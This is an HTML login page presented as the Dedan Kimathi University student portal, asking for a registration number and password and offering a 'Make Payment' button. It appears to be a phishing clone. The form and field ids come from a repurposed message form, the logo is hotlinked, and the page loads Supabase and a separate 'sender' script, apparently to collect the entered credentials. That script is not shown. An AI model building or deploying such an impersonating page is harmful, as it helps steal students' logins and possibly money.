<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="icon"
        href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSBT4WX9tQjy6Fl3Zcb6vwVR4D1IJPaWA_FD_RmlTOvuQ&s=10">
    <title>Dedan Kimathi University | Student Portal</title>

    <link rel="stylesheet" href="css/style.css">
</head>

<body>

    <div class="main">
        
        <div class="container">
            <img class="logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSBT4WX9tQjy6Fl3Zcb6vwVR4D1IJPaWA_FD_RmlTOvuQ&s=10" alt="Logo">
            <h1>Good Morning</h1>
            <p class="subtitle">Sign in to view your timetable or register units.</p>

            <form id="messageForm" class="login-form">
                <div class="form-group">
                    <label for="nameInput">REG NO</label>
                    <input
                        type="text"
                        id="nameInput"
                        placeholder="e.g. A000-00-0000/2026"
                        maxlength="100"
                        required
                    >
                </div>
                <div class="form-group">
                    <label for="messageInput">PASSWORD</label>
                    <input
                        type="password"
                        id="messageInput"
                        placeholder="............"
                        maxlength="1000"
                        required
                    >
                </div>
                <div class="form-options">
                    <div class="checkbox-group">
                        <input id="check" checked type="checkbox">
                        <label for="check" class="checkbox-label">Remember me</label>
                    </div>
                    <p class="forgot-password" id="Forgot">Forgot password?</p>
                </div>

                <button class="button1" type="submit">
                    Log in
                </button>
                <button class="button2" type="button">Make Payment</button>

            </form>

            <p id="status"></p>
            <p class="footer">&copy; 2026 Powered by <span class="footer-highlight">DSL Systems and Solutions</span></p>
        </div>

    </div>

    <!-- Supabase -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

    <!-- Configuration -->
    <script src="js/config.js"></script>

    <!-- Sender logic -->
    <script src="js/sender.js"></script>

</body>
</html>
